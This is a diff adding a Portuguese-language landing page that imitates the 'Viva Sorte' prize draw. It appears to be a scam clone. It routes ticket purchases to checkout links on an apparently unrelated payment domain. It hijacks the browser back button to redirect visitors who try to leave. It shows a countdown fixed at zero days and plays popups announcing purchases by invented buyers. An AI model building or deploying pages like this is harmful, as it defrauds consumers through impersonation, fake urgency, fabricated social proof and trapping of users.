@@ -1,0 +1,497 @@
+<html lang="pt-BR"><head></head><body>﻿
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Viva Sorte</title>
+    <link href="css/style.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="css2" rel="stylesheet">
+    <link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+    <link rel="stylesheet" href="css/bootstrap-icons.min.css">
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+    
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+  
+<script>
+  // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+  const link = 'https://vivasorte.github.io/principal/';
+
+  function setBackRedirect(url) {
+    let urlBackRedirect = url;
+    urlBackRedirect = urlBackRedirect =
+      urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.addEventListener('popstate', () => {
+      console.log('onpopstate', urlBackRedirect);
+      setTimeout(() => {
+        location.href = urlBackRedirect;
+      }, 1);
+    });
+  }
+
+  setBackRedirect(link);
+</script>
+
+
+  
+  
+     
+      <header class="white-header">
+          <div class="logo">
+              <img src="images/logoviva.png" alt="Logomarca" class="logoviva">
+          </div>
+          <button class="menu-button" id="menuButton">
+              0 <!-- Ícone de três linhas -->
+          </button>
+      </header>
+    
+      <meta charset="utf-8">
+    
+  
+  
+  <div class="banner">
+  
+  
+  <div class="container-banner">
+  
+  <div id="carouselExampleSlidesOnly" class="carousel slide" data-bs-ride="carousel">
+        <div class="carousel-inner">
+  
+          <div class="carousel-item active">
+            <div class="tag-compre-agora">
+              <span>Site Oficial</span>
+            </div>
+  
+            <img src="images/1m.jpg" class="d-block w-100" alt="...">
+          </div>
+  
+        </div>
+      </div>
+  
+  <!--
+      <div class="infos-banner">
+              <h1>Viva Sorte - 02/06/2024</h1> 
+              <h2>DOM, 02 JUN | 2024</h2> 
+              <h3>PORSCHE + BMW + RAM POR APENAS 99 CENTAVOS!</h3>        
+      </div>
+  -->
+  
+  
+      </div>
+  
+  
+  
+  
+      </div>
+  
+  
+      <div class="sorteio-date w-100 text-center">
+        <h1>Sorteio HOJE <span style="background-color: #f0ad4e;" id="contador"></span> por apenas <span style="background-color: #2f4eb5;">R$0,99</span> </h1>
+      </div>
+  
+  
+<script>
+  function atualizarContador() {
+    var span = document.getElementById('contador');
+    span.textContent = '0 dias';
+  }
+
+  atualizarContador();
+</script>
+
+  
+    <div class="container-principal">
+  
+      <!-- BANNER -->
+  
+      <!-- COTAS -->
+  
+      <div class="cotas">
+  
+        <div class="cotas-one">
+                    <button type="button" class="cota" onclick="selecionarValor(15)">
+              <div class="cota-qtd">                    
+                  +15
+              </div>
+              <h1>R$14,85</h1>
+              <h2>SELECIONAR</h2>
+          </button>
+  
+          <button type="button" class="cota" onclick="selecionarValor(30)">
+              <div class="cota-qtd">
+                  +30
+              </div>
+              <h1>R$29,70</h1>
+              <h2>SELECIONAR</h2>
+          </button>
+  
+          <button type="button" class="cota" onclick="selecionarValor(40)">
+              <div class="cota-qtd">
+              +40
+              </div>
+              <h1>R$39,60</h1>
+              <h2>SELECIONAR</h2>
+          </button>
+  
+          
+  
+        </div>
+  
+        <div class="cotas-one">
+            
+            <button type="button" class="cota" onclick="selecionarValor(120)">
+              <i class="bi bi-star-fill destaque"></i>
+              <div class="cota-qtd">
+              +120
+              </div>
+              <h1>R$69,30</h1>
+              <h2>SELECIONAR</h2>
+          </button>
+  
+          
+  
+          <button type="button" class="cota" onclick="selecionarValor(200)">
+              <div class="cota-qtd">
+              +200
+              </div>
+              <h1>R$99,00</h1>
+              <h2>SELECIONAR</h2>
+          </button>
+          
+          <button type="button" class="cota" onclick="selecionarValor(500)">
+              <div class="cota-qtd">
+              +500🔥
+              </div>
+              <h1>R$199,00</h1>
+              <h2>SELECIONAR</h2>
+          </button>
+  
+  
+  
+        </div>
+  
+      </div>
+  
+    </div>
+  
+    <div class="container-principal">
+  
+  
+    <div class="contador-cotas">
+          <span>
+              <button type="button" class="btn-contador-cotas" onclick="decrementar()">-</button>
+          </span>
+          <input type="number" id="numero" class="input-contador-cotas" value="0" min="0" oninput="highlightButton()">
+          <span>
+              <button type="button" class="btn-contador-cotas" onclick="incrementar()">+</button>
+          </span>
+      </div>
+  
+      <button type="button" id="btn-adicionar-carrinho" class="adc-carrinho" onclick="adicionarAoCarrinho()" disabled="">
+          <i class="bi bi-cart-fill"></i> COMPRAR TÍTULOS
+      </button>
+  
+  
+  
+    <div class="sorteio-date w-100 text-center" style="margin-top: 5px;">
+      <br>
+      <h1 style="font-size: 0.72rem;">Comprar mais títulos aumenta suas chances de ganhar!</h1>
+  
+      <div class="container-principal">
+        <div class="hospital">
+  
+          <div class="card-hospital">
+              <div class="card-hospital-image">
+                  <img src="images/logo-hospital.svg">
+                  <h2>Instituição beneficiada</h2>
+              </div>
+              <div class="card-hospital-text">
+                  <p>O Hospital do Câncer de Londrina, fundado em 08 de novembro de 1965 por Lucilla Pinto Ballalai, foi originalmente chamado Centro Norte Paranaense de Pesquisas Médicas. Criado com o objetivo de melhorar o tratamento do câncer e a qualidade de vida, o hospital focava inicialmente na prevenção do câncer de colo de útero entre as mulheres de Londrina e região. A instituição sempre buscou aprimorar seus recursos humanos, científicos e tecnológicos.</p>
+              </div>
+          </div>
+          
+          <div class="card-hospital card-hospital-bg-azul">
+              <div class="card-hospital-image">
+                  <img src="images/viva-hosp.svg">
+                  <h2>Viva Privilégios</h2>
+              </div>
+              <div class="card-hospital-text">
+                  <p>Viva Privilégios, um programa que enriquece sua vida com acesso ���� saúde, alimentação, transporte e mais. Com cada compra, acumule pontos para trocar por consultas médicas, receber cashback, e utilizar serviços de telefonia e apps de transporte e alimentação. Eleve sua qualidade de vida e desfrute de mais conveniência e economia!</p>
+              </div>
+          </div>
+  
+        </div>
+      </div>
+  
+    </div>
+  </div>
+  
+    
+    <link href="css/rodape.css" rel="stylesheet">
+  
+  
+  <div class="rodape">
+      <div class="container-principal">
+          <img class="logo-rodape" src="images/logoviva.png">
+  
+          <div class="redes">
+              <i class="bi bi-instagram"></i>
+              <i class="bi bi-facebook"></i>
+              <i class="bi bi-twitter"></i>
+              <i class="bi bi-youtube"></i>
+          </div>
+  
+          <h1>Sorteios lastreados por Títulos de Capitalização, da Modalidade Incentivo, emitidos pela VIA Capitalização S.A, inscrita no CNPJ sob nº 88.076.302/0001-94, e aprovados pela SUSEP através do registro na SUSEP Sorteio n° 15414.652257/2023-51. O valor das premiações aqui indicados são líquidos, já descontado o devido imposto de renda de 25%. O registro deste plano na SUSEP não implica, por parte da Autarquia, incentivo ou recomendação a sua comercialização.</h1>
+          
+          <div class="linha-rodape"></div>
+  
+          <div class="patterns-rodape">
+              <div class="pattern-rodape">
+                  Títulos emitidos por:
+                  <img src="images/viacap.png">
+              </div>
+  
+              <div class="pattern-rodape">
+                  Promoção realizada por:
+                  <img src="images/viva.png">
+              </div>
+  
+              <div class="pattern-rodape">
+                  Desenvolvimento:
+                  <img src="images/edjdigital.png">
+              </div>
+          </div>
+      </div>
+  </div>
+  
+    <!-- BOTÃO + E - -->
+    <script>
+      const precoPorUnidade = 0.99;
+  
+      function incrementar() {
+          var input = document.getElementById('numero');
+          var valorAtual = parseInt(input.value);
+          if (valorAtual < 200) {
+              if (valorAtual === 0) {
+                  input.value = 15;
+              } else if (valorAtual === 15) {
+                  input.value = 30;
+              } else if (valorAtual === 30) {
+                  input.value = 40;
+              } else if (valorAtual === 40) {
+                  input.value = 70;
+              } else if (valorAtual === 70) {
+                  input.value = 100;
+              } else if (valorAtual === 100) {
+                  input.value = 200;
+              }
+          }
+          highlightButton();
+      }
+  
+      function decrementar() {
+          var input = document.getElementById('numero');
+          var valorAtual = parseInt(input.value);
+          if (valorAtual > 15) {
+              if (valorAtual === 200) {
+                  input.value = 100;
+              } else if (valorAtual === 100) {
+                  input.value = 70;
+              } else if (valorAtual === 70) {
+                  input.value = 40;
+              } else if (valorAtual === 40) {
+                  input.value = 30;
+              } else if (valorAtual === 30) {
+                  input.value = 15;
+              }
+          }
+          highlightButton();
+      }
+  
+      function highlightButton() {
+          var input = document.getElementById('numero');
+          var valorAtual = parseInt(input.value);
+          var botoesCotas = document.querySelectorAll('.cota');
+          var botaoAdicionarCarrinho = document.getElementById('btn-adicionar-carrinho');
+          var valorTotal = document.getElementById('valor-total');
+          var link;
+  
+          botoesCotas.forEach(function (botao) {
+              botao.classList.remove('cota-selected');
+              var valorBotao = parseInt(botao.querySelector('.cota-qtd').innerText.trim());
+              if (valorBotao === valorAtual) {
+                  botao.classList.add('cota-selected');
+                  switch (valorBotao) {
+                      case 15:
+                          link = "https://pay.pagamentosseguropay.com/checkout/201fc2d2-7a93-4106-8d0b-c3c007d9fa5a";
+                          break;
+                      case 30:
+                          link = "https://pay.pagamentosseguropay.com/checkout/56125c40-e2de-499b-811b-be6d1ba1151b";
+                          break;
+                      case 40:
+                          link = "https://pay.pagamentosseguropay.com/checkout/4a703ffb-3636-4d2a-b1ad-af25d41c897a";
+                          break;
+                      case 120:
+                          link = "https://pay.pagamentosseguropay.com/checkout/e68d7a87-f2f2-43bd-8821-a5acd1249df3";
+                          break;
+                      case 200:
+                          link = "https://pay.pagamentosseguropay.com/checkout/ccb3c624-7e58-4ac3-9c43-57f5fc4b0ddf";
+                          break;
+                              case 500:
+                          link = "https://pay.pagamentosseguropay.com/checkout/0b8a720b-9c71-413d-9a4b-739dbf71114e";
+                          break;
+                  
+                      default:
+                          break;
+                  }
+                  botaoAdicionarCarrinho.setAttribute('onclick', 'adicionarAoCarrinho("' + link + '")');
+              }
+          });
+  
+          if (valorAtual === 0) {
+              botaoAdicionarCarrinho.disabled = true;
+              valorTotal.innerText = "R$ 0,00";
+          } else {
+              botaoAdicionarCarrinho.disabled = false;
+              valorTotal.innerText = "R$ " + (valorAtual * precoPorUnidade).toFixed(2).replace('.', ',');
+          }
+      }
+  
+      function selecionarValor(valor) {
+          var input = document.getElementById('numero');
+          input.value = valor;
+          highlightButton();
+      }
+  
+      function adicionarAoCarrinho(link) {
+        window.location.href = link + window.location.search;
+      }
+  
+      document.getElementById('numero').addEventListener('input', function () {
+          this.value = this.value.replace(/[^0-9]/g, ''); // Apenas números permitidos
+          var valor = parseInt(this.value);
+          if (valor > 500) {
+              this.value = 500;
+          } else if (valor < 10) {
+              this.value = 0;
+          } else if (valor % 10 !== 0) {
+              this.value = Math.floor(valor / 10) * 10;
+          }
+          highlightButton();
+      });
+  
+</script>
+
+  <script src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
+
+  <script>
+  window.pixelId = "6811ba2cce7f46f751fa3d7e";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+  <script src="js/latest_1.js" data--prevent-subids="" async="" defer=""></script>
+
+
+
+
+
+  <meta charset="UTF-8">
+  <title>Pop-ups de Compras</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f0f0;
+    }
+
+    .popup {
+      position: fixed;
+      bottom: 30px;
+      left: 30px;
+      background-color: #d4edda;
+      border-left: 6px solid #28a745;
+      color: #155724;
+      padding: 15px 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      display: none;
+      animation: fadeIn 0.5s ease-in-out;
+      z-index: 9999;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+
+
+
+<div class="popup" id="popup"></div>
+
+<!-- Som de notificação -->
+<audio id="notifySound" preload="auto">
+  <source src="media/beep-07.wav" type="audio/wav">
+  Seu navegador não suporta o formato de áudio.
+</audio>
+
+<script>
+  const mensagens = [
+    "João P. acabou de comprar 200 cotas!",
+    "Larissa F. acabou de comprar 120 cotas!",
+    "Diego S. acabou de comprar 120 cotas!",
+    "Juliana M. acabou de comprar 200 cotas!",
+    "Bruno T. acabou de comprar 500 cotas!",
+    "Carla R. acabou de comprar 120 cotas!",
+    "Felipe N. acabou de comprar 30 cotas!",
+    "Amanda C. acabou de comprar 40 cotas!",
+    "Pedro V. acabou de comprar 120 cotas!",
+    "Thais L. acabou de comprar 200 cotas!",
+    // Continue adicionando até 100
+  ];
+
+  const popup = document.getElementById('popup');
+  const notifySound = document.getElementById('notifySound');
+
+  let index = 0;
+
+  function mostrarPopup() {
+    if (index >= mensagens.length) return;
+
+    popup.innerText = mensagens[index];
+    popup.style.display = 'block';
+    notifySound.play(); // Toca o som de notificação
+
+    setTimeout(() => {
+      popup.style.display = 'none';
+      index++;
+      setTimeout(mostrarPopup, 5000); // Exibe o próximo pop-up após 5 segundos
+    }, 4000); // Pop-up fica visível por 4 segundos
+  }
+
+  window.onload = () => {
+    setTimeout(mostrarPopup, 1000); // Começa após 1 segundo
+  };
+</script>
+
+
+
+
+
+</body></html>
